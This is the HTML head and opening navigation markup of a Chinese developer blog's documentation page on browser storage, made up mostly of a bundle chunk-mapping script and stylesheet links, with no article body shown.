<!DOCTYPE html>
<html lang=&#34;en&#34; data-theme=&#34;&#34;>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<script type="text/javascript">/*<![CDATA[*/window.__chunkMapping={"main":["/main.d719e73e126f22665d27.css","/main.477abd2e0f7ae11842aa.js"],"component---site-src-pages-index-jsc-4-f-f99":["/component---site-src-pages-index-jsc-4-f-f99.7f8bb42332d3fb863b06.js"],"component---theme-blog-post-pageccc-cab":["/component---theme-blog-post-pageccc-cab.8e2d2ee446add4b2b98b.js"],"content---blog-2019-08-12-think-house-362-b31":["/content---blog-2019-08-12-think-house-362-b31.9dd4d64cef8935947cc6.js"],"metadata---blog-2019-08-12-think-house-3-b-6-904":["/metadata---blog-2019-08-12-think-house-3-b-6-904.d9830d5a5942cab785a0.js"],"component---theme-blog-list-pagea-6-a-7ba":["/component---theme-blog-list-pagea-6-a-7ba.0a21799c9e5ea3fceb3b.js"],"content---bloga-55-f4d":["/content---bloga-55-f4d.489c2054c790952ef46d.js"],"metadata---blog-92-a-15c":["/metadata---blog-92-a-15c.5ff7289cd93f83a7673d.js"],"component---theme-doc-legacy-page-9-e-7-ca5":["/component---theme-doc-legacy-page-9-e-7-ca5.3c38a2f40a51efdd72a0.css","/component---theme-doc-legacy-page-9-e-7-ca5.1085c0ca4dac1d879092.js"],"docsMetadata---docs-9-a-9-239":["/docsMetadata---docs-9-a-9-239.efc62167d7e7e974bd14.js"],"component---theme-doc-legacy-item-031-769":["/component---theme-doc-legacy-item-031-769.2f2552f02b6a918fee59.css","/component---theme-doc-legacy-item-031-769.63af36fb5b293fb44f17.js"],"content---docs-about-3-d-8-538":["/content---docs-about-3-d-8-538.b22f4002fb1de87b1230.js"],"metadata---docs-about-443-9ff":["/metadata---docs-about-443-9ff.73c084d649e4c149a16d.js"],"content---docs-base-compute-combinef-7-f-933":["/content---docs-base-compute-combinef-7-f-933.bbe804fc4e1766f967d3.js"],"metadata---docs-base-compute-combine-480-a12":["/metadata---docs-base-compute-combine-480-a12.3f3c4e034751065ae378.js"],"content---docs-database-mongo-2-c-4-a31":["/content---docs-database-mongo-2-c-4-a31.e91455dcec407920091d.js"],"metadata---docs-database-mongo-0-c-2-f76":["/metadata---docs-database-mongo-0-c-2-f76.af6ba28657bd992ab268.js"],"content---docs-algo-indexb-4-f-54a":["/content---docs-algo-indexb-4-f-54a.f544321e6098b7e21cb2.js"],"metadata---docs-algo-index-812-55b":["/metadata---docs-algo-index-812-55b.967a6c554af6d0ec71c7.js"],"content---docs-database-mysql-561-697":["/content---docs-database-mysql-561-697.8d9b06089ed38971996c.js"],"metadata---docs-database-mysql-2-f-1-3e5":["/metadata---docs-database-mysql-2-f-1-3e5.b8ec8aff626a76d0b3f1.js"],"content---docs-database-redise-5-d-9ae":["/content---docs-database-redise-5-d-9ae.8da280d7a5afc1ada019.js"],"metadata---docs-database-redis-4-a-0-66e":["/metadata---docs-database-redis-4-a-0-66e.1e20f9eb218cd3aaa120.js"],"content---docs-demo-index-648-2ab":["/content---docs-demo-index-648-2ab.7a9097eea3f4eb857d5f.js"],"metadata---docs-demo-indexa-04-089":["/metadata---docs-demo-indexa-04-089.d02205114cc145ec515a.js"],"content---docs-base-h-5586-54d":["/content---docs-base-h-5586-54d.2258338422d575187d27.js"],"metadata---docs-base-h-515-a-1cb":["/metadata---docs-base-h-515-a-1cb.50cde03a6341136d8e1e.js"],"content---docs-linux-fileec-1-765":["/content---docs-linux-fileec-1-765.b668459315fc826dbf36.js"],"metadata---docs-linux-file-65-c-c93":["/metadata---docs-linux-file-65-c-c93.06f1005462e771673c93.js"],"content---docs-linux-service-49-b-272":["/content---docs-linux-service-49-b-272.88cddff68450d2d288ad.js"],"metadata---docs-linux-serviceac-8-d7f":["/metadata---docs-linux-serviceac-8-d7f.a8db4496c4521adf47a9.js"],"content---docs-linux-soft-422-6cf":["/content---docs-linux-soft-422-6cf.5f724b64dea651a6dd94.js"],"metadata---docs-linux-softe-01-10b":["/metadata---docs-linux-softe-01-10b.dd8a48e3918d13d73eb8.js"],"content---docs-linux-indexcb-8-9a7":["/content---docs-linux-indexcb-8-9a7.f47eeb5f2d9d73fc2a84.js"],"metadata---docs-linux-index-73-e-38c":["/metadata---docs-linux-index-73-e-38c.753c4d1a4f0cce68c442.js"],"content---docs-nginx-index-16-d-468":["/content---docs-nginx-index-16-d-468.d2297635196c4020956c.js"],"metadata---docs-nginx-index-4-a-2-2e4":["/metadata---docs-nginx-index-4-a-2-2e4.0ab02bb90f0c7bc8d6bd.js"],"content---docs-nodejs-async-7-f-4-0af":["/content---docs-nodejs-async-7-f-4-0af.5454ce07fa8ff7325eaa.js"],"metadata---docs-nodejs-asyncc-40-22b":["/metadata---docs-nodejs-asyncc-40-22b.f8e18069e6bfba6ea18c.js"],"content---docs-nodejs-testaf-7-5fa":["/content---docs-nodejs-testaf-7-5fa.c53522930b8dc8c26e7c.js"],"metadata---docs-nodejs-testbf-0-08d":["/metadata---docs-nodejs-testbf-0-08d.a9a72c6fab71ce5736fd.js"],"content---docs-nodejs-safee-0-a-532":["/content---docs-nodejs-safee-0-a-532.656a522f1e2499551386.js"],"metadata---docs-nodejs-safe-287-46f":["/metadata---docs-nodejs-safe-287-46f.a48c917a3ab21d94ff84.js"],"content---docs-other-blogaab-295":["/content---docs-other-blogaab-295.90b83606127347166591.js"],"metadata---docs-other-blogc-8-f-558":["/metadata---docs-other-blogc-8-f-558.85a843134419b7762136.js"],"content---docs-nodejs-utild-25-062":["/content---docs-nodejs-utild-25-062.7abc674669aa1b8e7b27.js"],"metadata---docs-nodejs-util-0-fd-711":["/metadata---docs-nodejs-util-0-fd-711.d07acf2cb8f71bdf235d.js"],"content---docs-other-maced-3-b03":["/content---docs-other-maced-3-b03.144f24782733bff7f170.js"],"metadata---docs-other-macc-8-c-bc8":["/metadata---docs-other-macc-8-c-bc8.f1056687ee296d57433a.js"],"content---docs-other-kindle-rss-789-941":["/content---docs-other-kindle-rss-789-941.191a58e9a0d6983d3b18.js"],"metadata---docs-other-kindle-rssb-06-572":["/metadata---docs-other-kindle-rssb-06-572.56dbcb3d237d53220829.js"],"content---docs-patterns-action-61-d-c76":["/content---docs-patterns-action-61-d-c76.1db7f876e899fec516eb.js"],"metadata---docs-patterns-action-124-4bd":["/metadata---docs-patterns-action-124-4bd.81816e08d7e197fbc992.js"],"content---docs-other-resourceea-2-ecf":["/content---docs-other-resourceea-2-ecf.79aff6c31eaaa438938c.js"],"metadata---docs-other-resource-348-7b5":["/metadata---docs-other-resource-348-7b5.f36a0245c8152f928000.js"],"content---docs-patterns-bridge-335-1e9":["/content---docs-patterns-bridge-335-1e9.b15592c2851328564e6b.js"],"metadata---docs-patterns-bridgefbb-495":["/metadata---docs-patterns-bridgefbb-495.36847cfe0994f3493cb7.js"],"content---docs-patterns-adapter-555-7ec":["/content---docs-patterns-adapter-555-7ec.2112961b332c479ac795.js"],"metadata---docs-patterns-adapter-464-f76":["/metadata---docs-patterns-adapter-464-f76.5b7ed24c6f3769df781c.js"],"content---docs-patterns-chain-of-responsibility-579-dfa":["/content---docs-patterns-chain-of-responsibility-579-dfa.66dea4296433b6cf98c9.js"],"metadata---docs-patterns-chain-of-responsibility-014-8a0":["/metadata---docs-patterns-chain-of-responsibility-014-8a0.3df75643a5b906e0e95e.js"],"content---docs-patterns-builder-5-e-5-e3a":["/content---docs-patterns-builder-5-e-5-e3a.e6629fbefca8e3a8aac2.js"],"metadata---docs-patterns-builderead-d21":["/metadata---docs-patterns-builderead-d21.d2361792867897216584.js"],"content---docs-patterns-commande-85-4af":["/content---docs-patterns-commande-85-4af.2c197182cb87c0ae1f68.js"],"metadata---docs-patterns-command-80-a-50e":["/metadata---docs-patterns-command-80-a-50e.9f9dded3c382b0277e99.js"],"content---docs-patterns-composite-33-e-80d":["/content---docs-patterns-composite-33-e-80d.2dd077321435164de2fc.js"],"metadata---docs-patterns-composite-238-38a":["/metadata---docs-patterns-composite-238-38a.0501a960cff28811d86b.js"],"content---docs-patterns-decorator-944-f6d":["/content---docs-patterns-decorator-944-f6d.231b091ccecdcf27e54c.js"],"metadata---docs-patterns-decorator-142-9e2":["/metadata---docs-patterns-decorator-142-9e2.af6480bb05e36aaf5bbc.js"],"content---docs-patterns-facade-4-ef-b2f":["/content---docs-patterns-facade-4-ef-b2f.2f3608c06db80e48fffa.js"],"metadata---docs-patterns-facade-7-a-8-297":["/metadata---docs-patterns-facade-7-a-8-297.8994ec660f8979f26d3f.js"],"content---docs-patterns-factoryf-00-197":["/content---docs-patterns-factoryf-00-197.a5183b1395d1ee6b4c04.js"],"metadata---docs-patterns-factory-659-5cc":["/metadata---docs-patterns-factory-659-5cc.64975baaafd3bc6b0d9a.js"],"content---docs-patterns-flyweighte-43-831":["/content---docs-patterns-flyweighte-43-831.e3ac10a150bc7e94cbc5.js"],"metadata---docs-patterns-flyweightaba-d18":["/metadata---docs-patterns-flyweightaba-d18.e87d091a67e991b4cbee.js"],"content---docs-patterns-index-90-d-78a":["/content---docs-patterns-index-90-d-78a.40dac31f5fafd19ace72.js"],"metadata---docs-patterns-index-63-b-9e3":["/metadata---docs-patterns-index-63-b-9e3.3a645f801826c6531d22.js"],"content---docs-patterns-interpreterc-34-4ff":["/content---docs-patterns-interpreterc-34-4ff.b26bdf0f10f33e86db6e.js"],"metadata---docs-patterns-interpreter-484-b15":["/metadata---docs-patterns-interpreter-484-b15.8bf5662275ef37990978.js"],"content---docs-patterns-mediator-685-4ef":["/content---docs-patterns-mediator-685-4ef.af8aaa2f6c46fba56ffa.js"],"metadata---docs-patterns-mediator-421-d91":["/metadata---docs-patterns-mediator-421-d91.37e0d59a654f39db1d68.js"],"content---docs-patterns-iterator-3-bc-1d4":["/content---docs-patterns-iterator-3-bc-1d4.553678cbac18b755d2c1.js"],"metadata---docs-patterns-iterator-288-f03":["/metadata---docs-patterns-iterator-288-f03.096363b38361bcc943f6.js"],"content---docs-patterns-memento-740-286":["/content---docs-patterns-memento-740-286.883958ef8d16f3e8537c.js"],"metadata---docs-patterns-memento-098-f69":["/metadata---docs-patterns-memento-098-f69.a737176f488438f1d246.js"],"content---docs-patterns-observer-73-f-441":["/content---docs-patterns-observer-73-f-441.ab60d4d039ef9ba8920d.js"],"metadata---docs-patterns-observere-90-4f8":["/metadata---docs-patterns-observere-90-4f8.6ced65f460928095c70c.js"],"content---docs-patterns-proxyb-6-e-4ef":["/content---docs-patterns-proxyb-6-e-4ef.cca080c448d090f41be7.js"],"metadata---docs-patterns-proxye-47-a3c":["/metadata---docs-patterns-proxye-47-a3c.234134dcae7db5ad9a43.js"],"content---docs-patterns-singleton-710-727":["/content---docs-patterns-singleton-710-727.45783f8b86cf328f4660.js"],"metadata---docs-patterns-singletonb-35-b33":["/metadata---docs-patterns-singletonb-35-b33.e4410205e4b63b2b0192.js"],"content---docs-patterns-prototype-93-c-d70":["/content---docs-patterns-prototype-93-c-d70.28f4edaac5325115ccb2.js"],"metadata---docs-patterns-prototype-8-ac-89b":["/metadata---docs-patterns-prototype-8-ac-89b.81c1926ddca4c0ee17c5.js"],"content---docs-patterns-stated-4-a-502":["/content---docs-patterns-stated-4-a-502.aff490fbcfbd4d613e22.js"],"metadata---docs-patterns-stateb-04-819":["/metadata---docs-patterns-stateb-04-819.dbfb7b76a5f0bf1070ef.js"],"content---docs-patterns-strategy-9-e-9-61c":["/content---docs-patterns-strategy-9-e-9-61c.2154ac691f82d145481e.js"],"metadata---docs-patterns-strategy-6-ce-04f":["/metadata---docs-patterns-strategy-6-ce-04f.dc13e188379edea75baf.js"],"content---docs-patterns-templateee-1-6e8":["/content---docs-patterns-templateee-1-6e8.99542a775d4d7331ab97.js"],"metadata---docs-patterns-template-3-bc-bf3":["/metadata---docs-patterns-template-3-bc-bf3.daecb8563311a626ef0b.js"],"content---docs-patterns-visitorff-6-bda":["/content---docs-patterns-visitorff-6-bda.4551872699bc75006cb1.js"],"metadata---docs-patterns-visitore-38-a38":["/metadata---docs-patterns-visitore-38-a38.6c1f416beb83d0fa4cc5.js"],"content---docs-base-net-tcpd-0-c-487":["/content---docs-base-net-tcpd-0-c-487.ded6692aa2655c6522aa.js"],"metadata---docs-base-net-tcp-212-c6f":["/metadata---docs-base-net-tcp-212-c6f.8dd35e78bad2b65b9006.js"],"content---docs-f-2-e-browser-cache-260-909":["/content---docs-f-2-e-browser-cache-260-909.edf99a580762ddae6c5e.js"],"metadata---docs-f-2-e-browser-cache-361-a94":["/metadata---docs-f-2-e-browser-cache-361-a94.28e7216342319a1a6962.js"],"content---docs-base-net-http-1-cc-352":["/content---docs-base-net-http-1-cc-352.8c0532a7b7d2b66979ee.js"],"metadata---docs-base-net-http-373-f55":["/metadata---docs-base-net-http-373-f55.a21647d861d5aaf9bd51.js"],"content---docs-f-2-e-browser-eventa-5-d-93e":["/content---docs-f-2-e-browser-eventa-5-d-93e.ecfddb3e4b879bc8d4a6.js"],"metadata---docs-f-2-e-browser-event-0-cc-f3c":["/metadata---docs-f-2-e-browser-event-0-cc-f3c.eb85d5e63ff050f42c82.js"],"content---docs-f-2-e-browser-devtool-850-efc":["/content---docs-f-2-e-browser-devtool-850-efc.5b23ab4200958d1b3637.js"],"metadata---docs-f-2-e-browser-devtool-3-ab-d05":["/metadata---docs-f-2-e-browser-devtool-3-ab-d05.9fe5ea30673d765636ce.js"],"content---docs-f-2-e-browser-eventloop-473-bc4":["/content---docs-f-2-e-browser-eventloop-473-bc4.88281ef36c33f14955d2.js"],"metadata---docs-f-2-e-browser-eventloopcbb-9eb":["/metadata---docs-f-2-e-browser-eventloopcbb-9eb.44ebbe5e3e5a0be45b22.js"],"content---docs-f-2-e-browser-fetch-147-732":["/content---docs-f-2-e-browser-fetch-147-732.73df2df1c899b03dcdb5.js"],"metadata---docs-f-2-e-browser-fetch-918-58f":["/metadata---docs-f-2-e-browser-fetch-918-58f.67ea03597bbedee8f8cb.js"],"content---docs-f-2-e-browser-storage-0-e-2-cd2":["/content---docs-f-2-e-browser-storage-0-e-2-cd2.e4c1c246ee4ee3ef5ef5.js"],"metadata---docs-f-2-e-browser-storagea-21-a7b":["/metadata---docs-f-2-e-browser-storagea-21-a7b.2693ccc675c0f98748f7.js"],"content---docs-f-2-e-browser-dom-018-426":["/content---docs-f-2-e-browser-dom-018-426.407ac50822c262f3ea09.js"],"metadata---docs-f-2-e-browser-domb-41-90c":["/metadata---docs-f-2-e-browser-domb-41-90c.40c3d9385d9932dc62ef.js"],"content---docs-f-2-e-browser-v-8-c-83-515":["/content---docs-f-2-e-browser-v-8-c-83-515.25aa6d0bfec445cd0539.js"],"metadata---docs-f-2-e-browser-v-8-e-60-c45":["/metadata---docs-f-2-e-browser-v-8-e-60-c45.772e0b55782ed70ec81e.js"],"content---docs-f-2-e-browser-work-31-f-d77":["/content---docs-f-2-e-browser-work-31-f-d77.a0c465be0361c3dbe22c.js"],"metadata---docs-f-2-e-browser-work-9-d-7-1ef":["/metadata---docs-f-2-e-browser-work-9-d-7-1ef.259c8c7b2df2b3dead04.js"],"content---docs-f-2-e-css-indexf-55-541":["/content---docs-f-2-e-css-indexf-55-541.f41dc6a33da05bec58f8.js"],"metadata---docs-f-2-e-css-indexe-08-461":["/metadata---docs-f-2-e-css-indexe-08-461.621a33c5d05c74a2bd99.js"],"content---docs-f-2-e-html-index-9-d-1-79a":["/content---docs-f-2-e-html-index-9-d-1-79a.aa737df8610ee0edd562.js"],"metadata---docs-f-2-e-html-index-24-f-1e4":["/metadata---docs-f-2-e-html-index-24-f-1e4.70a9dd97a9cd531129d0.js"],"content---docs-f-2-e-javascript-grammer-447-369":["/content---docs-f-2-e-javascript-grammer-447-369.f7b80ec1b5e8db94c92a.js"],"metadata---docs-f-2-e-javascript-grammer-6-df-3af":["/metadata---docs-f-2-e-javascript-grammer-6-df-3af.23d93ed5348e42d4d908.js"],"content---docs-f-2-e-javascript-modulee-10-ff1":["/content---docs-f-2-e-javascript-modulee-10-ff1.e8c585a2b0b180b14c2f.js"],"metadata---docs-f-2-e-javascript-moduleee-6-b43":["/metadata---docs-f-2-e-javascript-moduleee-6-b43.a7967cffe7804555bfc9.js"],"content---docs-f-2-e-monitor-index-391-ad0":["/content---docs-f-2-e-monitor-index-391-ad0.503db2e8f3fe2efaa097.js"],"metadata---docs-f-2-e-monitor-indexa-56-d7f":["/metadata---docs-f-2-e-monitor-indexa-56-d7f.970c636d0c0ec47b0bf0.js"],"content---docs-f-2-e-javascript-asynceb-2-d37":["/content---docs-f-2-e-javascript-asynceb-2-d37.1d92b62388af21ab94de.js"],"metadata---docs-f-2-e-javascript-async-09-f-030":["/metadata---docs-f-2-e-javascript-async-09-f-030.25a7228490d4cf49f2b2.js"],"content---docs-f-2-e-javascript-oop-3-a-2-e5a":["/content---docs-f-2-e-javascript-oop-3-a-2-e5a.c65260e27d9db92b251e.js"],"metadata---docs-f-2-e-javascript-oopaa-3-9b9":["/metadata---docs-f-2-e-javascript-oopaa-3-9b9.e942231bbc0e495f0e6a.js"],"content---docs-f-2-e-javascript-skill-687-c8f":["/content---docs-f-2-e-javascript-skill-687-c8f.74bd2f75577a97336731.js"],"metadata---docs-f-2-e-javascript-skilld-97-3a2":["/metadata---docs-f-2-e-javascript-skilld-97-3a2.cd114e7df341a974907b.js"],"content---docs-f-2-e-javascript-regexp-987-85e":["/content---docs-f-2-e-javascript-regexp-987-85e.42bab3214e526417d3cf.js"],"metadata---docs-f-2-e-javascript-regexp-239-ff9":["/metadata---docs-f-2-e-javascript-regexp-239-ff9.ba4fb34bdc5dcc94e0bf.js"],"content---docs-f-2-e-javascript-type-58-e-e47":["/content---docs-f-2-e-javascript-type-58-e-e47.5ad3368307959460988d.js"],"metadata---docs-f-2-e-javascript-typef-33-dde":["/metadata---docs-f-2-e-javascript-typef-33-dde.e96ec684ec8263d46c9d.js"],"content---docs-f-2-e-performance-indexaef-e1d":["/content---docs-f-2-e-performance-indexaef-e1d.a19b9d087cde8aa1b16c.js"],"metadata---docs-f-2-e-performance-index-3-de-87c":["/metadata---docs-f-2-e-performance-index-3-de-87c.fa958c859c38b85285c6.js"],"content---docs-f-2-e-react-index-0-cb-3f0":["/content---docs-f-2-e-react-index-0-cb-3f0.815aee0de96f4a421b3b.js"],"metadata---docs-f-2-e-react-indexc-85-6a6":["/metadata---docs-f-2-e-react-indexc-85-6a6.c4cf5f74ba2e693a1574.js"],"content---docs-f-2-e-react-native-alert-6-d-1-303":["/content---docs-f-2-e-react-native-alert-6-d-1-303.a904ff079c64362e4f44.js"],"metadata---docs-f-2-e-react-native-alert-5-f-9-3e3":["/metadata---docs-f-2-e-react-native-alert-5-f-9-3e3.7968965bd72899a9fafe.js"],"content---docs-f-2-e-react-native-androide-34-3a4":["/content---docs-f-2-e-react-native-androide-34-3a4.117d7a94fad5167e51ad.js"],"metadata---docs-f-2-e-react-native-android-0-b-3-456":["/metadata---docs-f-2-e-react-native-android-0-b-3-456.1636cbe5df919bbf3734.js"],"content---docs-f-2-e-react-native-camera-597-89d":["/content---docs-f-2-e-react-native-camera-597-89d.59bbc0f5548e77f8f4dd.js"],"metadata---docs-f-2-e-react-native-camera-27-a-253":["/metadata---docs-f-2-e-react-native-camera-27-a-253.3005b4f4738ea37d8732.js"],"content---docs-f-2-e-react-native-bugly-8-d-4-ab2":["/content---docs-f-2-e-react-native-bugly-8-d-4-ab2.d2acf37aa28e499cfb67.js"],"metadata---docs-f-2-e-react-native-buglyadb-596":["/metadata---docs-f-2-e-react-native-buglyadb-596.3394199ee5fbf770c1f4.js"],"content---docs-f-2-e-react-native-deploy-500-e54":["/content---docs-f-2-e-react-native-deploy-500-e54.fbe7dc438cca9b471128.js"],"metadata---docs-f-2-e-react-native-deploy-4-cf-03c":["/metadata---docs-f-2-e-react-native-deploy-4-cf-03c.42e8179692e50d9f2fa9.js"],"content---docs-f-2-e-react-native-code-pusha-39-174":["/content---docs-f-2-e-react-native-code-pusha-39-174.a2b0a669c96b1cdfaf9c.js"],"metadata---docs-f-2-e-react-native-code-push-7-b-7-231":["/metadata---docs-f-2-e-react-native-code-push-7-b-7-231.d1b2c854735aec9d02de.js"],"content---docs-f-2-e-react-native-form-7-a-1-0fb":["/content---docs-f-2-e-react-native-form-7-a-1-0fb.2edc8f77f59028df5ad3.js"],"metadata---docs-f-2-e-react-native-form-69-e-589":["/metadata---docs-f-2-e-react-native-form-69-e-589.7d39120ee98e8a5d6192.js"],"content---docs-f-2-e-react-native-fetch-756-af5":["/content---docs-f-2-e-react-native-fetch-756-af5.18e0f039ff3be3fe54ec.js"],"metadata---docs-f-2-e-react-native-fetchd-41-27d":["/metadata---docs-f-2-e-react-native-fetchd-41-27d.56ddedd34e8ac926dcc9.js"],"content---docs-f-2-e-react-native-issue-0-f-6-864":["/content---docs-f-2-e-react-native-issue-0-f-6-864.2d17cdbc4910fa8fe779.js"],"metadata---docs-f-2-e-react-native-issue-214-5cd":["/metadata---docs-f-2-e-react-native-issue-214-5cd.50942c03421bf7c141a7.js"],"content---docs-f-2-e-react-native-gitf-9-e-d83":["/content---docs-f-2-e-react-native-gitf-9-e-d83.dd440a13b75c0c6c9de6.js"],"metadata---docs-f-2-e-react-native-git-3-f-0-1e2":["/metadata---docs-f-2-e-react-native-git-3-f-0-1e2.1303c9e04bf2f36d0e06.js"],"content---docs-f-2-e-react-native-loading-84-c-73a":["/content---docs-f-2-e-react-native-loading-84-c-73a.65ca63a01b7b73bce402.js"],"metadata---docs-f-2-e-react-native-loadingf-98-f5d":["/metadata---docs-f-2-e-react-native-loadingf-98-f5d.63d4a7c73f4e5252a780.js"],"content---docs-f-2-e-react-native-index-889-a61":["/content---docs-f-2-e-react-native-index-889-a61.6cf777c526246692245b.js"],"metadata---docs-f-2-e-react-native-indexb-92-e43":["/metadata---docs-f-2-e-react-native-indexb-92-e43.e937a026ddf6a55d3c88.js"],"content---docs-f-2-e-react-native-share-to-wechatf-7-d-17b":["/content---docs-f-2-e-react-native-share-to-wechatf-7-d-17b.c1714b30c6abed71a055.js"],"metadata---docs-f-2-e-react-native-share-to-wechatd-32-d2a":["/metadata---docs-f-2-e-react-native-share-to-wechatd-32-d2a.48c72ec3aec362b7906f.js"],"content---docs-f-2-e-react-native-react-native-videoc-1-d-e43":["/content---docs-f-2-e-react-native-react-native-videoc-1-d-e43.cfbf91fed2c4623a6b3a.js"],"metadata---docs-f-2-e-react-native-react-native-video-97-c-eaa":["/metadata---docs-f-2-e-react-native-react-native-video-97-c-eaa.6710af3d91d98cca7324.js"],"content---docs-f-2-e-react-native-size-5-b-4-c24":["/content---docs-f-2-e-react-native-size-5-b-4-c24.65d77f6a064b0605331f.js"],"metadata---docs-f-2-e-react-native-sizefa-9-e54":["/metadata---docs-f-2-e-react-native-sizefa-9-e54.7f25ffec75b11ea6df77.js"],"content---docs-f-2-e-react-native-save-to-camera-693-68d":["/content---docs-f-2-e-react-native-save-to-camera-693-68d.59f7e8c3896af23a1bc5.js"],"metadata---docs-f-2-e-react-native-save-to-camera-7-a-4-735":["/metadata---docs-f-2-e-react-native-save-to-camera-7-a-4-735.86ebaa9c12e9f9eb3b00.js"],"content---docs-f-2-e-react-native-source-877-2ea":["/content---docs-f-2-e-react-native-source-877-2ea.acf2e5e3a1130e890d40.js"],"metadata---docs-f-2-e-react-native-source-9-b-5-f09":["/metadata---docs-f-2-e-react-native-source-9-b-5-f09.eba1114d7802361bed43.js"],"content---docs-f-2-e-react-native-tech-226-30f":["/content---docs-f-2-e-react-native-tech-226-30f.f3c520f2a64e6686cd7b.js"],"metadata---docs-f-2-e-react-native-techbca-407":["/metadata---docs-f-2-e-react-native-techbca-407.60e8005e9f5a4d90463f.js"],"content---docs-f-2-e-react-native-waterfall-629-6ad":["/content---docs-f-2-e-react-native-waterfall-629-6ad.c9d69ecd70b3af367874.js"],"metadata---docs-f-2-e-react-native-waterfall-2-d-9-e37":["/metadata---docs-f-2-e-react-native-waterfall-2-d-9-e37.6586128947e8ed32f960.js"],"content---docs-f-2-e-react-native-update-rn-93-f-50e":["/content---docs-f-2-e-react-native-update-rn-93-f-50e.7e2e2a951faab482273b.js"],"metadata---docs-f-2-e-react-native-update-rn-323-92d":["/metadata---docs-f-2-e-react-native-update-rn-323-92d.49766a88b8b68b2070db.js"],"content---docs-f-2-e-react-native-wechate-7-f-088":["/content---docs-f-2-e-react-native-wechate-7-f-088.6a6ebdeabe884a34c622.js"],"metadata---docs-f-2-e-react-native-wechate-47-3f8":["/metadata---docs-f-2-e-react-native-wechate-47-3f8.eae10f64ddc42ecc50cb.js"],"content---docs-f-2-e-safe-index-165-7db":["/content---docs-f-2-e-safe-index-165-7db.4b6e7f8e05e788bbb2e6.js"],"metadata---docs-f-2-e-safe-index-647-b0c":["/metadata---docs-f-2-e-safe-index-647-b0c.ebb3ccf6c878ce3fd8ac.js"],"content---docs-f-2-e-test-index-1-ae-bf1":["/content---docs-f-2-e-test-index-1-ae-bf1.f1822f2f4ac5eea69f74.js"],"metadata---docs-f-2-e-test-index-47-d-1a6":["/metadata---docs-f-2-e-test-index-47-d-1a6.f5a7d1897db19fd43e79.js"],"content---docs-f-2-e-test-jestfc-3-df1":["/content---docs-f-2-e-test-jestfc-3-df1.d040b9a2bcc6ee4112db.js"],"metadata---docs-f-2-e-test-jestda-3-2d2":["/metadata---docs-f-2-e-test-jestda-3-2d2.adab61b10dc884940697.js"],"content---docs-f-2-e-vue-index-02-b-a5c":["/content---docs-f-2-e-vue-index-02-b-a5c.1a89ee7799561a11c838.js"],"metadata---docs-f-2-e-vue-indexefd-70b":["/metadata---docs-f-2-e-vue-indexefd-70b.cf1da06406c97aa9fa7e.js"],"content---docs-f-2-e-vue-origind-8-a-797":["/content---docs-f-2-e-vue-origind-8-a-797.d2a1c92c815111e5ae49.js"],"metadata---docs-f-2-e-vue-origin-587-f6e":["/metadata---docs-f-2-e-vue-origin-587-f6e.e813ff92cd5be1db3996.js"],"content---docs-f-2-e-vue-zf-6-bb-fd6":["/content---docs-f-2-e-vue-zf-6-bb-fd6.692f41b8d417fafc6e9b.js"],"metadata---docs-f-2-e-vue-zf-258-73c":["/metadata---docs-f-2-e-vue-zf-258-73c.20ff3796deb4b2fd5507.js"],"content---docs-source-jquery-event-088-dda":["/content---docs-source-jquery-event-088-dda.f6e5868415ea4e65585a.js"],"metadata---docs-source-jquery-event-095-2e1":["/metadata---docs-source-jquery-event-095-2e1.1c699411bca0b71a279d.js"],"content---docs-f-2-e-webpack-basic-indexb-92-061":["/content---docs-f-2-e-webpack-basic-indexb-92-061.a356aab10b36725975a9.js"],"metadata---docs-f-2-e-webpack-basic-indexe-25-12c":["/metadata---docs-f-2-e-webpack-basic-indexe-25-12c.bc97bc27a12dd1743d78.js"],"content---docs-f-2-e-webpack-principle-indexab-1-27c":["/content---docs-f-2-e-webpack-principle-indexab-1-27c.72e6a91cc91a1c9ba7fb.js"],"metadata---docs-f-2-e-webpack-principle-index-6-fa-123":["/metadata---docs-f-2-e-webpack-principle-index-6-fa-123.6036461c39812f0a9a54.js"],"component---theme-blog-tags-posts-page-687-b6c":["/component---theme-blog-tags-posts-page-687-b6c.cdc359f6a4d913ae5117.js"],"metadata---blog-tags-house-375-d32":["/metadata---blog-tags-house-375-d32.e20a6720ecb0953ce25d.js"],"metadata---blog-tags-thinkd-55-455":["/metadata---blog-tags-thinkd-55-455.465f7f9506ae524a47b1.js"],"component---theme-blog-tags-list-page-01-a-d0b":["/component---theme-blog-tags-list-page-01-a-d0b.c1d0294e65cf51f7434b.js"],"tags---blog-tagse-51-a7c":["/tags---blog-tagse-51-a7c.90fa7a1570bf6531abb5.js"]};/*]]>*/</script>

<title data-react-helmet="true">浏览器存储</title>

<meta data-react-helmet="true" charset="utf-8"/><meta data-react-helmet="true" http-equiv="x-ua-compatible" content="ie=edge"/><meta data-react-helmet="true" name="viewport" content="width=device-width"/><meta data-react-helmet="true" property="og:title" content="浏览器存储"/><meta data-react-helmet="true" name="description" content="## 简介"/><meta data-react-helmet="true" property="og:description" content="## 简介"/><meta data-react-helmet="true" property="og:url" content="https://www.banli17.com/docs/f2e/browser/storage"/><meta data-react-helmet="true" name="twitter:card" content="summary"/>

<link data-react-helmet="true" rel="shortcut icon" href="/img/favicon.ico"/>


<link rel="stylesheet" type="text/css" href="/main.d719e73e126f22665d27.css" />

<link rel="stylesheet" type="text/css" href="/1.196ce05925ea6d776920.css" />

<link rel="stylesheet" type="text/css" href="/2.76ced7e22babc8d30c3a.css" />

<link rel="stylesheet" type="text/css" href="/component---theme-doc-legacy-page-9-e-7-ca5.3c38a2f40a51efdd72a0.css" />

<link rel="stylesheet" type="text/css" href="/3.76fc2d47232fd1193413.css" />

<link rel="stylesheet" type="text/css" href="/component---theme-doc-legacy-item-031-769.2f2552f02b6a918fee59.css" />

</head>
<body >
<div id="__docusaurus">
<nav class="navbar navbar--light navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><div aria-label="Navigation bar toggle" class="navbar__toggle" role="button" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" viewBox="0 0 30 30" role="img" focusable="false"><title>Menu</title><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></div><a aria-current="page" class="navbar__brand active" href="/"><img class="navbar__logo" src="/img/logo.svg" alt="板栗17的博客"/><strong>banli17.com</strong></a><a class="navbar__item navbar__link" label="前端" position="left" href="/docs/f2e/html/index">前端</a><a class="navbar__item navbar__link" label="源码笔记" position="left" href="/docs/source/jquery/event">源码笔记</a><a class="navbar__item navbar__link" label="NodeJS" position="left" href="/docs/nodejs/util">NodeJS</a><a 